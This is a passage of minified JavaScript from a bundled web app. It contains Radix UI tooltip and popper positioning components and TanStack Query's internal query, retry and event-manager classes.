                        (ut = N.transformOrigin) == null ? void 0 : ut.x,
                        (ge = N.transformOrigin) == null ? void 0 : ge.y,
                    ].join(" "),
                    ...(((ln = N.hide) == null ? void 0 : ln.referenceHidden) && {
                        visibility: "hidden",
                        pointerEvents: "none",
                    }),
                },
                dir: e.dir,
                children: c.jsx(V2, {
                    scope: n,
                    placedSide: T,
                    onArrowChange: k,
                    arrowX: U,
                    arrowY: q,
                    shouldHideArrow: X,
                    children: c.jsx(Ke.div, {
                        "data-side": T,
                        "data-align": L,
                        ...v,
                        ref: y,
                        style: { ...v.style, animation: I ? void 0 : "none" },
                    }),
                }),
            })
        );
    });
Ig.displayName = Hu;
var Dg = "PopperArrow",
    K2 = { top: "bottom", right: "left", bottom: "top", left: "right" },
    zg = x.forwardRef(function (t, n) {
        const { __scopePopper: r, ...o } = t,
            s = W2(Dg, r),
            i = K2[s.placedSide];
        return c.jsx("span", {
            ref: s.onArrowChange,
            style: {
                position: "absolute",
                left: s.arrowX,
                top: s.arrowY,
                [i]: 0,
                transformOrigin: { top: "", right: "0 0", bottom: "center 0", left: "100% 0" }[s.placedSide],
                transform: {
                    top: "translateY(100%)",
                    right: "translateY(50%) rotate(90deg) translateX(-50%)",
                    bottom: "rotate(180deg)",
                    left: "translateY(50%) rotate(-90deg) translateX(50%)",
                }[s.placedSide],
                visibility: s.shouldHideArrow ? "hidden" : void 0,
            },
            children: c.jsx(H2, { ...o, ref: n, style: { ...o.style, display: "block" } }),
        });
    });
zg.displayName = Dg;
function Q2(e) {
    return e !== null;
}
var G2 = (e) => ({
    name: "transformOrigin",
    options: e,
    fn(t) {
        var w, g, h;
        const { placement: n, rects: r, middlewareData: o } = t,
            i = ((w = o.arrow) == null ? void 0 : w.centerOffset) !== 0,
            a = i ? 0 : e.arrowWidth,
            l = i ? 0 : e.arrowHeight,
            [u, d] = Fg(n),
            p = { start: "0%", center: "50%", end: "100%" }[d],
            m = (((g = o.arrow) == null ? void 0 : g.x) ?? 0) + a / 2,
            f = (((h = o.arrow) == null ? void 0 : h.y) ?? 0) + l / 2;
        let S = "",
            v = "";
        return (
            u === "bottom"
                ? ((S = i ? p : `${m}px`), (v = `${-l}px`))
                : u === "top"
                  ? ((S = i ? p : `${m}px`), (v = `${r.floating.height + l}px`))
                  : u === "right"
                    ? ((S = `${-l}px`), (v = i ? p : `${f}px`))
                    : u === "left" && ((S = `${r.floating.width + l}px`), (v = i ? p : `${f}px`)),
            { data: { x: S, y: v } }
        );
    },
});
function Fg(e) {
    const [t, n = "center"] = e.split("-");
    return [t, n];
}
var q2 = Og,
    X2 = Ig,
    Y2 = zg,
    [Ea, pk] = va("Tooltip", [Mg]),
    Bu = Mg(),
    Ug = "TooltipProvider",
    Z2 = 700,
    zp = "tooltip.open",
    [J2, $g] = Ea(Ug),
    Hg = (e) => {
        const {
                __scopeTooltip: t,
                delayDuration: n = Z2,
                skipDelayDuration: r = 300,
                disableHoverableContent: o = !1,
                children: s,
            } = e,
            i = x.useRef(!0),
            a = x.useRef(!1),
            l = x.useRef(0);
        return (
            x.useEffect(() => {
                const u = l.current;
                return () => window.clearTimeout(u);
            }, []),
            c.jsx(J2, {
                scope: t,
                isOpenDelayedRef: i,
                delayDuration: n,
                onOpen: x.useCallback(() => {
                    window.clearTimeout(l.current), (i.current = !1);
                }, []),
                onClose: x.useCallback(() => {
                    window.clearTimeout(l.current), (l.current = window.setTimeout(() => (i.current = !0), r));
                }, [r]),
                isPointerInTransitRef: a,
                onPointerInTransitChange: x.useCallback((u) => {
                    a.current = u;
                }, []),
                disableHoverableContent: o,
                children: s,
            })
        );
    };
Hg.displayName = Ug;
var Bg = "Tooltip",
    [fk, Na] = Ea(Bg),
    Nc = "TooltipTrigger",
    eS = x.forwardRef((e, t) => {
        const { __scopeTooltip: n, ...r } = e,
            o = Na(Nc, n),
            s = $g(Nc, n),
            i = Bu(n),
            a = x.useRef(null),
            l = Nt(t, a, o.onTriggerChange),
            u = x.useRef(!1),
            d = x.useRef(!1),
            p = x.useCallback(() => (u.current = !1), []);
        return (
            x.useEffect(() => () => document.removeEventListener("pointerup", p), [p]),
            c.jsx(q2, {
                asChild: !0,
                ...i,
                children: c.jsx(Ke.button, {
                    "aria-describedby": o.open ? o.contentId : void 0,
                    "data-state": o.stateAttribute,
                    ...r,
                    ref: l,
                    onPointerMove: Se(e.onPointerMove, (m) => {
                        m.pointerType !== "touch" &&
                            !d.current &&
                            !s.isPointerInTransitRef.current &&
                            (o.onTriggerEnter(), (d.current = !0));
                    }),
                    onPointerLeave: Se(e.onPointerLeave, () => {
                        o.onTriggerLeave(), (d.current = !1);
                    }),
                    onPointerDown: Se(e.onPointerDown, () => {
                        o.open && o.onClose(),
                            (u.current = !0),
                            document.addEventListener("pointerup", p, { once: !0 });
                    }),
                    onFocus: Se(e.onFocus, () => {
                        u.current || o.onOpen();
                    }),
                    onBlur: Se(e.onBlur, o.onClose),
                    onClick: Se(e.onClick, o.onClose),
                }),
            })
        );
    });
eS.displayName = Nc;
var tS = "TooltipPortal",
    [mk, nS] = Ea(tS, { forceMount: void 0 }),
    ho = "TooltipContent",
    Vg = x.forwardRef((e, t) => {
        const n = nS(ho, e.__scopeTooltip),
            { forceMount: r = n.forceMount, side: o = "top", ...s } = e,
            i = Na(ho, e.__scopeTooltip);
        return c.jsx(Pu, {
            present: r || i.open,
            children: i.disableHoverableContent
                ? c.jsx(Wg, { side: o, ...s, ref: t })
                : c.jsx(rS, { side: o, ...s, ref: t }),
        });
    }),
    rS = x.forwardRef((e, t) => {
        const n = Na(ho, e.__scopeTooltip),
            r = $g(ho, e.__scopeTooltip),
            o = x.useRef(null),
            s = Nt(t, o),
            [i, a] = x.useState(null),
            { trigger: l, onClose: u } = n,
            d = o.current,
            { onPointerInTransitChange: p } = r,
            m = x.useCallback(() => {
                a(null), p(!1);
            }, [p]),
            f = x.useCallback(
                (S, v) => {
                    const w = S.currentTarget,
                        g = { x: S.clientX, y: S.clientY },
                        h = lS(g, w.getBoundingClientRect()),
                        y = cS(g, h),
                        b = uS(v.getBoundingClientRect()),
                        k = pS([...y, ...b]);
                    a(k), p(!0);
                },
                [p]
            );
        return (
            x.useEffect(() => () => m(), [m]),
            x.useEffect(() => {
                if (l && d) {
                    const S = (w) => f(w, d),
                        v = (w) => f(w, l);
                    return (
                        l.addEventListener("pointerleave", S),
                        d.addEventListener("pointerleave", v),
                        () => {
                            l.removeEventListener("pointerleave", S), d.removeEventListener("pointerleave", v);
                        }
                    );
                }
            }, [l, d, f, m]),
            x.useEffect(() => {
                if (i) {
                    const S = (v) => {
                        const w = v.target,
                            g = { x: v.clientX, y: v.clientY },
                            h = (l == null ? void 0 : l.contains(w)) || (d == null ? void 0 : d.contains(w)),
                            y = !dS(g, i);
                        h ? m() : y && (m(), u());
                    };
                    return (
                        document.addEventListener("pointermove", S),
                        () => document.removeEventListener("pointermove", S)
                    );
                }
            }, [l, d, i, u, m]),
            c.jsx(Wg, { ...e, ref: s })
        );
    }),
    [oS, sS] = Ea(Bg, { isInside: !1 }),
    iS = nv("TooltipContent"),
    Wg = x.forwardRef((e, t) => {
        const {
                __scopeTooltip: n,
                children: r,
                "aria-label": o,
                onEscapeKeyDown: s,
                onPointerDownOutside: i,
                ...a
            } = e,
            l = Na(ho, n),
            u = Bu(n),
            { onClose: d } = l;
        return (
            x.useEffect(() => (document.addEventListener(zp, d), () => document.removeEventListener(zp, d)), [d]),
            x.useEffect(() => {
                if (l.trigger) {
                    const p = (m) => {
                        const f = m.target;
                        f != null && f.contains(l.trigger) && d();
                    };
                    return (
                        window.addEventListener("scroll", p, { capture: !0 }),
                        () => window.removeEventListener("scroll", p, { capture: !0 })
                    );
                }
            }, [l.trigger, d]),
            c.jsx(Nu, {
                asChild: !0,
                disableOutsidePointerEvents: !1,
                onEscapeKeyDown: s,
                onPointerDownOutside: i,
                onFocusOutside: (p) => p.preventDefault(),
                onDismiss: d,
                children: c.jsxs(X2, {
                    "data-state": l.stateAttribute,
                    ...u,
                    ...a,
                    ref: t,
                    style: {
                        ...a.style,
                        "--radix-tooltip-content-transform-origin": "var(--radix-popper-transform-origin)",
                        "--radix-tooltip-content-available-width": "var(--radix-popper-available-width)",
                        "--radix-tooltip-content-available-height": "var(--radix-popper-available-height)",
                        "--radix-tooltip-trigger-width": "var(--radix-popper-anchor-width)",
                        "--radix-tooltip-trigger-height": "var(--radix-popper-anchor-height)",
                    },
                    children: [
                        c.jsx(iS, { children: r }),
                        c.jsx(oS, {
                            scope: n,
                            isInside: !0,
                            children: c.jsx(Pv, { id: l.contentId, role: "tooltip", children: o || r }),
                        }),
                    ],
                }),
            })
        );
    });
Vg.displayName = ho;
var Kg = "TooltipArrow",
    aS = x.forwardRef((e, t) => {
        const { __scopeTooltip: n, ...r } = e,
            o = Bu(n);
        return sS(Kg, n).isInside ? null : c.jsx(Y2, { ...o, ...r, ref: t });
    });
aS.displayName = Kg;
function lS(e, t) {
    const n = Math.abs(t.top - e.y),
        r = Math.abs(t.bottom - e.y),
        o = Math.abs(t.right - e.x),
        s = Math.abs(t.left - e.x);
    switch (Math.min(n, r, o, s)) {
        case s:
            return "left";
        case o:
            return "right";
        case n:
            return "top";
        case r:
            return "bottom";
        default:
            throw new Error("unreachable");
    }
}
function cS(e, t, n = 5) {
    const r = [];
    switch (t) {
        case "top":
            r.push({ x: e.x - n, y: e.y + n }, { x: e.x + n, y: e.y + n });
            break;
        case "bottom":
            r.push({ x: e.x - n, y: e.y - n }, { x: e.x + n, y: e.y - n });
            break;
        case "left":
            r.push({ x: e.x + n, y: e.y - n }, { x: e.x + n, y: e.y + n });
            break;
        case "right":
            r.push({ x: e.x - n, y: e.y - n }, { x: e.x - n, y: e.y + n });
            break;
    }
    return r;
}
function uS(e) {
    const { top: t, right: n, bottom: r, left: o } = e;
    return [
        { x: o, y: t },
        { x: n, y: t },
        { x: n, y: r },
        { x: o, y: r },
    ];
}
function dS(e, t) {
    const { x: n, y: r } = e;
    let o = !1;
    for (let s = 0, i = t.length - 1; s < t.length; i = s++) {
        const a = t[s],
            l = t[i],
            u = a.x,
            d = a.y,
            p = l.x,
            m = l.y;
        d > r != m > r && n < ((p - u) * (r - d)) / (m - d) + u && (o = !o);
    }
    return o;
}
function pS(e) {
    const t = e.slice();
    return t.sort((n, r) => (n.x < r.x ? -1 : n.x > r.x ? 1 : n.y < r.y ? -1 : n.y > r.y ? 1 : 0)), fS(t);
}
function fS(e) {
    if (e.length <= 1) return e.slice();
    const t = [];
    for (let r = 0; r < e.length; r++) {
        const o = e[r];
        for (; t.length >= 2; ) {
            const s = t[t.length - 1],
                i = t[t.length - 2];
            if ((s.x - i.x) * (o.y - i.y) >= (s.y - i.y) * (o.x - i.x)) t.pop();
            else break;
        }
        t.push(o);
    }
    t.pop();
    const n = [];
    for (let r = e.length - 1; r >= 0; r--) {
        const o = e[r];
        for (; n.length >= 2; ) {
            const s = n[n.length - 1],
                i = n[n.length - 2];
            if ((s.x - i.x) * (o.y - i.y) >= (s.y - i.y) * (o.x - i.x)) n.pop();
            else break;
        }
        n.push(o);
    }
    return n.pop(), t.length === 1 && n.length === 1 && t[0].x === n[0].x && t[0].y === n[0].y ? t : t.concat(n);
}
var mS = Hg,
    Qg = Vg;
const hS = mS,
    gS = x.forwardRef(({ className: e, sideOffset: t = 4, ...n }, r) =>
        c.jsx(Qg, {
            ref: r,
            sideOffset: t,
            className: yr(
                "z-50 overflow-hidden rounded-md border bg-popover px-3 py-1.5 text-sm text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2",
                e
            ),
            ...n,
        })
    );
gS.displayName = Qg.displayName;
var Pa = class {
        constructor() {
            (this.listeners = new Set()), (this.subscribe = this.subscribe.bind(this));
        }
        subscribe(e) {
            return (
                this.listeners.add(e),
                this.onSubscribe(),
                () => {
                    this.listeners.delete(e), this.onUnsubscribe();
                }
            );
        }
        hasListeners() {
            return this.listeners.size > 0;
        }
        onSubscribe() {}
        onUnsubscribe() {}
    },
    Ta = typeof window > "u" || "Deno" in globalThis;
function vt() {}
function yS(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function vS(e) {
    return typeof e == "number" && e >= 0 && e !== 1 / 0;
}
function xS(e, t) {
    return Math.max(e + (t || 0) - Date.now(), 0);
}
function Pc(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function wS(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function Fp(e, t) {
    const { type: n = "all", exact: r, fetchStatus: o, predicate: s, queryKey: i, stale: a } = e;
    if (i) {
        if (r) {
            if (t.queryHash !== Vu(i, t.options)) return !1;
        } else if (!vs(t.queryKey, i)) return !1;
    }
    if (n !== "all") {
        const l = t.isActive();
        if ((n === "active" && !l) || (n === "inactive" && l)) return !1;
    }
    return !((typeof a == "boolean" && t.isStale() !== a) || (o && o !== t.state.fetchStatus) || (s && !s(t)));
}
function Up(e, t) {
    const { exact: n, status: r, predicate: o, mutationKey: s } = e;
    if (s) {
        if (!t.options.mutationKey) return !1;
        if (n) {
            if (ys(t.options.mutationKey) !== ys(s)) return !1;
        } else if (!vs(t.options.mutationKey, s)) return !1;
    }
    return !((r && t.state.status !== r) || (o && !o(t)));
}
function Vu(e, t) {
    return ((t == null ? void 0 : t.queryKeyHashFn) || ys)(e);
}
function ys(e) {
    return JSON.stringify(e, (t, n) =>
        Tc(n)
            ? Object.keys(n)
                  .sort()
                  .reduce((r, o) => ((r[o] = n[o]), r), {})
            : n
    );
}
function vs(e, t) {
    return e === t
        ? !0
        : typeof e != typeof t
          ? !1
          : e && t && typeof e == "object" && typeof t == "object"
            ? Object.keys(t).every((n) => vs(e[n], t[n]))
            : !1;
}
function Gg(e, t) {
    if (e === t) return e;
    const n = $p(e) && $p(t);
    if (n || (Tc(e) && Tc(t))) {
        const r = n ? e : Object.keys(e),
            o = r.length,
            s = n ? t : Object.keys(t),
            i = s.length,
            a = n ? [] : {},
            l = new Set(r);
        let u = 0;
        for (let d = 0; d < i; d++) {
            const p = n ? d : s[d];
            ((!n && l.has(p)) || n) && e[p] === void 0 && t[p] === void 0
                ? ((a[p] = void 0), u++)
                : ((a[p] = Gg(e[p], t[p])), a[p] === e[p] && e[p] !== void 0 && u++);
        }
        return o === i && u === o ? e : a;
    }
    return t;
}
function $p(e) {
    return Array.isArray(e) && e.length === Object.keys(e).length;
}
function Tc(e) {
    if (!Hp(e)) return !1;
    const t = e.constructor;
    if (t === void 0) return !0;
    const n = t.prototype;
    return !(!Hp(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype);
}
function Hp(e) {
    return Object.prototype.toString.call(e) === "[object Object]";
}
function SS(e) {
    return new Promise((t) => {
        setTimeout(t, e);
    });
}
function bS(e, t, n) {
    return typeof n.structuralSharing == "function"
        ? n.structuralSharing(e, t)
        : n.structuralSharing !== !1
          ? Gg(e, t)
          : t;
}
function kS(e, t, n = 0) {
    const r = [...e, t];
    return n && r.length > n ? r.slice(1) : r;
}
function CS(e, t, n = 0) {
    const r = [t, ...e];
    return n && r.length > n ? r.slice(0, -1) : r;
}
var Wu = Symbol();
function qg(e, t) {
    return !e.queryFn && t != null && t.initialPromise
        ? () => t.initialPromise
        : !e.queryFn || e.queryFn === Wu
          ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`))
          : e.queryFn;
}
var er,
    wn,
    Yr,
    nf,
    ES =
        ((nf = class extends Pa {
            constructor() {
                super();
                ee(this, er);
                ee(this, wn);
                ee(this, Yr);
                K(this, Yr, (t) => {
                    if (!Ta && window.addEventListener) {
                        const n = () => t();
                        return (
                            window.addEventListener("visibilitychange", n, !1),
                            () => {
                                window.removeEventListener("visibilitychange", n);
                            }
                        );
                    }
                });
            }
            onSubscribe() {
                P(this, wn) || this.setEventListener(P(this, Yr));
            }
            onUnsubscribe() {
                var t;
                this.hasListeners() || ((t = P(this, wn)) == null || t.call(this), K(this, wn, void 0));
            }
            setEventListener(t) {
                var n;
                K(this, Yr, t),
                    (n = P(this, wn)) == null || n.call(this),
                    K(
                        this,
                        wn,
                        t((r) => {
                            typeof r == "boolean" ? this.setFocused(r) : this.onFocus();
                        })
                    );
            }
            setFocused(t) {
                P(this, er) !== t && (K(this, er, t), this.onFocus());
            }
            onFocus() {
                const t = this.isFocused();
                this.listeners.forEach((n) => {
                    n(t);
                });
            }
            isFocused() {
                var t;
                return typeof P(this, er) == "boolean"
                    ? P(this, er)
                    : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden";
            }
        }),
        (er = new WeakMap()),
        (wn = new WeakMap()),
        (Yr = new WeakMap()),
        nf),
    Xg = new ES(),
    Zr,
    Sn,
    Jr,
    rf,
    NS =
        ((rf = class extends Pa {
            constructor() {
                super();
                ee(this, Zr, !0);
                ee(this, Sn);
                ee(this, Jr);
                K(this, Jr, (t) => {
                    if (!Ta && window.addEventListener) {
                        const n = () => t(!0),
                            r = () => t(!1);
                        return (
                            window.addEventListener("online", n, !1),
                            window.addEventListener("offline", r, !1),
                            () => {
                                window.removeEventListener("online", n), window.removeEventListener("offline", r);
                            }
                        );
                    }
                });
            }
            onSubscribe() {
                P(this, Sn) || this.setEventListener(P(this, Jr));
            }
            onUnsubscribe() {
                var t;
                this.hasListeners() || ((t = P(this, Sn)) == null || t.call(this), K(this, Sn, void 0));
            }
            setEventListener(t) {
                var n;
                K(this, Jr, t), (n = P(this, Sn)) == null || n.call(this), K(this, Sn, t(this.setOnline.bind(this)));
            }
            setOnline(t) {
                P(this, Zr) !== t &&
                    (K(this, Zr, t),
                    this.listeners.forEach((r) => {
                        r(t);
                    }));
            }
            isOnline() {
                return P(this, Zr);
            }
        }),
        (Zr = new WeakMap()),
        (Sn = new WeakMap()),
        (Jr = new WeakMap()),
        rf),
    Ji = new NS();
function PS() {
    let e, t;
    const n = new Promise((o, s) => {
        (e = o), (t = s);
    });
    (n.status = "pending"), n.catch(() => {});
    function r(o) {
        Object.assign(n, o), delete n.resolve, delete n.reject;
    }
    return (
        (n.resolve = (o) => {
            r({ status: "fulfilled", value: o }), e(o);
        }),
        (n.reject = (o) => {
            r({ status: "rejected", reason: o }), t(o);
        }),
        n
    );
}
function TS(e) {
    return Math.min(1e3 * 2 ** e, 3e4);
}
function Yg(e) {
    return (e ?? "online") === "online" ? Ji.isOnline() : !0;
}
var Zg = class extends Error {
    constructor(e) {
        super("CancelledError"),
            (this.revert = e == null ? void 0 : e.revert),
            (this.silent = e == null ? void 0 : e.silent);
    }
};
function gl(e) {
    return e instanceof Zg;
}
function Jg(e) {
    let t = !1,
        n = 0,
        r = !1,
        o;
    const s = PS(),
        i = (v) => {
            var w;
            r || (m(new Zg(v)), (w = e.abort) == null || w.call(e));
        },
        a = () => {
            t = !0;
        },
        l = () => {
            t = !1;
        },
        u = () => Xg.isFocused() && (e.networkMode === "always" || Ji.isOnline()) && e.canRun(),
        d = () => Yg(e.networkMode) && e.canRun(),
        p = (v) => {
            var w;
            r || ((r = !0), (w = e.onSuccess) == null || w.call(e, v), o == null || o(), s.resolve(v));
        },
        m = (v) => {
            var w;
            r || ((r = !0), (w = e.onError) == null || w.call(e, v), o == null || o(), s.reject(v));
        },
        f = () =>
            new Promise((v) => {
                var w;
                (o = (g) => {
                    (r || u()) && v(g);
                }),
                    (w = e.onPause) == null || w.call(e);
            }).then(() => {
                var v;
                (o = void 0), r || (v = e.onContinue) == null || v.call(e);
            }),
        S = () => {
            if (r) return;
            let v;
            const w = n === 0 ? e.initialPromise : void 0;
            try {
                v = w ?? e.fn();
            } catch (g) {
                v = Promise.reject(g);
            }
            Promise.resolve(v)
                .then(p)
                .catch((g) => {
                    var C;
                    if (r) return;
                    const h = e.retry ?? (Ta ? 0 : 3),
                        y = e.retryDelay ?? TS,
                        b = typeof y == "function" ? y(n, g) : y,
                        k = h === !0 || (typeof h == "number" && n < h) || (typeof h == "function" && h(n, g));
                    if (t || !k) {
                        m(g);
                        return;
                    }
                    n++,
                        (C = e.onFail) == null || C.call(e, n, g),
                        SS(b)
                            .then(() => (u() ? void 0 : f()))
                            .then(() => {
                                t ? m(g) : S();
                            });
                });
        };
    return {
        promise: s,
        cancel: i,
        continue: () => (o == null || o(), s),
        cancelRetry: a,
        continueRetry: l,
        canStart: d,
        start: () => (d() ? S() : f().then(S), s),
    };
}
var jS = (e) => setTimeout(e, 0);
function RS() {
    let e = [],
        t = 0,
        n = (a) => {
            a();
        },
        r = (a) => {
            a();
        },
        o = jS;
    const s = (a) => {
            t
                ? e.push(a)
                : o(() => {
                      n(a);
                  });
        },
        i = () => {
            const a = e;
            (e = []),
                a.length &&
                    o(() => {
                        r(() => {
                            a.forEach((l) => {
                                n(l);
                            });
                        });
                    });
        };
    return {
        batch: (a) => {
            let l;
            t++;
            try {
                l = a();
            } finally {
                t--, t || i();
            }
            return l;
        },
        batchCalls:
            (a) =>
            (...l) => {
                s(() => {
                    a(...l);
                });
            },
        schedule: s,
        setNotifyFunction: (a) => {
            n = a;
        },
        setBatchNotifyFunction: (a) => {
            r = a;
        },
        setScheduler: (a) => {
            o = a;
        },
    };
}
var Ie = RS(),
    tr,
    of,
    ey =
        ((of = class {
            constructor() {
                ee(this, tr);
            }
            destroy() {
                this.clearGcTimeout();
            }
            scheduleGc() {
                this.clearGcTimeout(),
                    vS(this.gcTime) &&
                        K(
                            this,
                            tr,
                            setTimeout(() => {
                                this.optionalRemove();
                            }, this.gcTime)
                        );
            }
            updateGcTime(e) {
                this.gcTime = Math.max(this.gcTime || 0, e ?? (Ta ? 1 / 0 : 5 * 60 * 1e3));
            }
            clearGcTimeout() {
                P(this, tr) && (clearTimeout(P(this, tr)), K(this, tr, void 0));
            }
        }),
        (tr = new WeakMap()),
        of),
    eo,
    nr,
    nt,
    rr,
    Ae,
    Ss,
    or,
    xt,
    Vt,
    sf,
    AS =
        ((sf = class extends ey {
            constructor(t) {
                super();
                ee(this, xt);
                ee(this, eo);
                ee(this, nr);
                ee(this, nt);
                ee(this, rr);
                ee(this, Ae);
                ee(this, Ss);
                ee(this, or);
                K(this, or, !1),
                    K(this, Ss, t.defaultOptions),
                    this.setOptions(t.options),
                    (this.observers = []),
                    K(this, rr, t.client),
                    K(this, nt, P(this, rr).getQueryCache()),
                    (this.queryKey = t.queryKey),
                    (this.queryHash = t.queryHash),
                    K(this, eo, _S(this.options)),
                    (this.state = t.state ?? P(this, eo)),
                    this.scheduleGc();
            }
            get meta() {
                return this.options.meta;
            }
            get promise() {
                var t;
                return (t = P(this, Ae)) == null ? void 0 : t.promise;
            }
            setOptions(t) {
                (this.options = { ...P(this, Ss), ...t }), this.updateGcTime(this.options.gcTime);
            }
            optionalRemove() {
                !this.observers.length && this.state.fetchStatus === "idle" && P(this, nt).remove(this);
            }
            setData(t, n) {
                const r = bS(this.state.data, t, this.options);
                return (
                    Te(this, xt, Vt).call(this, {
                        data: r,
                        type: "success",
                        dataUpdatedAt: n == null ? void 0 : n.updatedAt,
                        manual: n == null ? void 0 : n.manual,
                    }),
                    r
                );
            }
            setState(t, n) {
                Te(this, xt, Vt).call(this, { type: "setState", state: t, setStateOptions: n });
            }
            cancel(t) {
                var r, o;
                const n = (r = P(this, Ae)) == null ? void 0 : r.promise;
                return (o = P(this, Ae)) == null || o.cancel(t), n ? n.then(vt).catch(vt) : Promise.resolve();
            }
            destroy() {
                super.destroy(), this.cancel({ silent: !0 });
            }
            reset() {
                this.destroy(), this.setState(P(this, eo));
            }
            isActive() {
                return this.observers.some((t) => wS(t.options.enabled, this) !== !1);
            }
            isDisabled() {
                return this.getObserversCount() > 0
                    ? !this.isActive()
                    : this.options.queryFn === Wu || this.state.dataUpdateCount + this.state.errorUpdateCount === 0;
            }
            isStatic() {
                return this.getObserversCount() > 0
                    ? this.observers.some((t) => Pc(t.options.staleTime, this) === "static")
                    : !1;
            }
            isStale() {
                return this.getObserversCount() > 0
                    ? this.observers.some((t) => t.getCurrentResult().isStale)
                    : this.state.data === void 0 || this.state.isInvalidated;
            }
            isStaleByTime(t = 0) {
                return this.state.data === void 0
                    ? !0
                    : t === "static"
                      ? !1
                      : this.state.isInvalidated
                        ? !0
                        : !xS(this.state.dataUpdatedAt, t);
            }
            onFocus() {
                var n;
                const t = this.observers.find((r) => r.shouldFetchOnWindowFocus());
                t == null || t.refetch({ cancelRefetch: !1 }), (n = P(this, Ae)) == null || n.continue();
            }
            onOnline() {
                var n;
                const t = this.observers.find((r) => r.shouldFetchOnReconnect());
                t == null || t.refetch({ cancelRefetch: !1 }), (n = P(this, Ae)) == null || n.continue();
            }
            addObserver(t) {
                this.observers.includes(t) ||
                    (this.observers.push(t),
                    this.clearGcTimeout(),
                    P(this, nt).notify({ type: "observerAdded", query: this, observer: t }));
            }
            removeObserver(t) {
                this.observers.includes(t) &&
                    ((this.observers = this.observers.filter((n) => n !== t)),
                    this.observers.length ||
                        (P(this, Ae) && (P(this, or) ? P(this, Ae).cancel({ revert: !0 }) : P(this, Ae).cancelRetry()),
                        this.scheduleGc()),
                    P(this, nt).notify({ type: "observerRemoved", query: this, observer: t }));
            }
            getObserversCount() {
                return this.observers.length;
            }
            invalidate() {
                this.state.isInvalidated || Te(this, xt, Vt).call(this, { type: "invalidate" });
            }
            fetch(t, n) {
                var u, d, p;
                if (this.state.fetchStatus !== "idle") {
                    if (this.state.data !== void 0 && n != null && n.cancelRefetch) this.cancel({ silent: !0 });
                    else if (P(this, Ae)) return P(this, Ae).continueRetry(), P(this, Ae).promise;
                }
                if ((t && this.setOptions(t), !this.options.queryFn)) {
                    const m = this.observers.find((f) => f.options.queryFn);
                    m && this.setOptions(m.options);
                }
                const r = new AbortController(),
                    o = (m) => {
                        Object.defineProperty(m, "signal", { enumerable: !0, get: () => (K(this, or, !0), r.signal) });
                    },
                    s = () => {
                        const m = qg(this.options, n),
                            S = (() => {
                                const v = { client: P(this, rr), queryKey: this.queryKey, meta: this.meta };
                                return o(v), v;
                            })();
                        return K(this, or, !1), this.options.persister ? this.options.persister(m, S, this) : m(S);
                    },
                    a = (() => {
                        const m = {
                            fetchOptions: n,
                            options: this.options,
                            queryKey: this.queryKey,
                            client: P(this, rr),
                            state: this.state,
                            fetchFn: s,
                        };
                        return o(m), m;
                    })();
                (u = this.options.behavior) == null || u.onFetch(a, this),
                    K(this, nr, this.state),
                    (this.state.fetchStatus === "idle" ||
                        this.state.fetchMeta !== ((d = a.fetchOptions) == null ? void 0 : d.meta)) &&
                        Te(this, xt, Vt).call(this, {
                            type: "fetch",
                            meta: (p = a.fetchOptions) == null ? void 0 : p.meta,
                        });
                const l = (m) => {
                    var f, S, v, w;
                    (gl(m) && m.silent) || Te(this, xt, Vt).call(this, { type: "error", error: m }),
                        gl(m) ||
                            ((S = (f = P(this, nt).config).onError) == null || S.call(f, m, this),
                            (w = (v = P(this, nt).config).onSettled) == null || w.call(v, this.state.data, m, this)),
                        this.scheduleGc();
                };
                return (
                    K(
                        this,
                        Ae,
                        Jg({
                            initialPromise: n == null ? void 0 : n.initialPromise,
                            fn: a.fetchFn,
                            abort: r.abort.bind(r),
                            onSuccess: (m) => {
                                var f, S, v, w;
                                if (m === void 0) {
                                    l(new Error(`${this.queryHash} data is undefined`));
                                    return;
                                }
                                try {
                                    this.setData(m);
                                } catch (g) {
                                    l(g);
                                    return;
                                }
                                (S = (f = P(this, nt).config).onSuccess) == null || S.call(f, m, this),
                                    (w = (v = P(this, nt).config).onSettled) == null ||
                                        w.call(v, m, this.state.error, this),
                                    this.scheduleGc();
                            },
                            onError: l,
                            onFail: (m, f) => {
                                Te(this, xt, Vt).call(this, { type: "failed", failureCount: m, error: f });
                            },
                            onPause: () => {
                                Te(this, xt, Vt).call(this, { type: "pause" });
                            },
                            onContinue: () => {
                                Te(this, xt, Vt).call(this, { type: "continue" });
                            },
                            retry: a.options.retry,
                            retryDelay: a.options.retryDelay,
                            networkMode: a.options.networkMode,
                            canRun: () => !0,
                        })
                    ),
                    P(this, Ae).start()
                );
            }
        }),
        (eo = new WeakMap()),
        (nr = new WeakMap()),
        (nt = new WeakMap()),
        (rr = new WeakMap()),
        (Ae = new WeakMap()),
        (Ss = new WeakMap()),
        (or = new WeakMap()),
        (xt = new WeakSet()),
        (Vt = function (t) {
            const n = (r) => {
                switch (t.type) {
                    case "failed":
                        return { ...r, fetchFailureCount: t.failureCount, fetchFailureReason: t.error };
                    case "pause":
                        return { ...r, fetchStatus: "paused" };
                    case "continue":
                        return { ...r, fetchStatus: "fetching" };
                    case "fetch":
                        return { ...r, ...MS(r.data, this.options), fetchMeta: t.meta ?? null };
                    case "success":
                        return (
                            K(this, nr, void 0),
                            {
                                ...r,
                                data: t.data,
                                dataUpdateCount: r.dataUpdateCount + 1,
                                dataUpdatedAt: t.dataUpdatedAt ?? Date.now(),
                                error: null,
                                isInvalidated: !1,
                                status: "success",
                                ...(!t.manual && {
                                    fetchStatus: "idle",
                                    fetchFailureCount: 0,
                                    fetchFailureReason: null,
                                }),
                            }
                        );
                    case "error":
                        const o = t.error;
                        return gl(o) && o.revert && P(this, nr)
                            ? { ...P(this, nr), fetchStatus: "idle" }
                            : {
                                  ...r,
                                  error: o,
                                  errorUpdateCount: r.errorUpdateCount + 1,
                                  errorUpdatedAt: Date.now(),
                                  fetchFailureCount: r.fetchFailureCount + 1,
                                  fetchFailureReason: o,
                                  fetchStatus: "idle",
                                  status: "error",
                              };
                    case "invalidate":
                        return { ...r, isInvalidated: !0 };
                    case "setState":
